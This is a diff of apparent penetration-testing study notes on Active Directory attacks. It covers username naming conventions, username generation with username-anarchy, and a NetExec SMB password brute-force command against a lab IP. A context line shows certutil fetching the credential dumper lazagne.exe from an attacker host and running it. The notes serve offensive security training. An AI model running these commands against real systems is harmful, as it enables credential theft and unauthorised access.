@@ -342,3 +342,60 @@ certutil -urlcache -split -f "http://PWNIP:8000/lazagne.exe" C:\Windows\Temp\laz
 C:\Windows\Temp\lazagne.exe all
 ```
 
+# Attacking Active Directory and NTDS.dit
+
+![[Attacking AD & NTDS.png]]
+
+When a Windows system join a domain, it will not reference to the SAM database to validate logon requests. The domain-joined system will now send auth requests to be validated by the domain controller.
+
+Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:
+
+| **Username convention**             | Practical example for `Jane Jill Doe` |
+| ----------------------------------- | ------------------------------------- |
+| `firstinitiallastname`              | jdoe                                  |
+| `firstinitialmiddleinitiallastname` | jjdoe                                 |
+| `firstnamelastname`                 | janedoe                               |
+| `firstname.lastname`                | jane.doe                              |
+| `lastname.firstname`                | doe.jane                              |
+| `nickname`                          | doedoehacksstuff                      |
+
+```ad-caution
+Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like **a907** (or something similar) back to **joe.smith**. That way, email messages can get through, but the actual internal username isn't disclosed, making password spraying harder.
+```
+
+We can use automated tools to generate usernames such as: [username-anarchy:](https://github.com/urbanadventurer/username-anarchy).
+
+**Example Usage:**
+
+```sh
+./username-anarchy -i /home/ltnbob/names.txt
+
+# Output
+ben 
+benwilliamson 
+ben.williamson 
+benwilli 
+benwill 
+benw 
+b.williamson 
+bwilliamson 
+wben 
+w.ben 
+williamsonb 
+williamson 
+williamson.b 
+williamson.ben 
+bw 
+bob
+...SNIP...
+```
+
+#### Enumerating valid usernames with Kerbrute
+
+![[kerbrute.png]]
+#### Launching a brute-force attack with NetExec
+
+```sh
+netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+
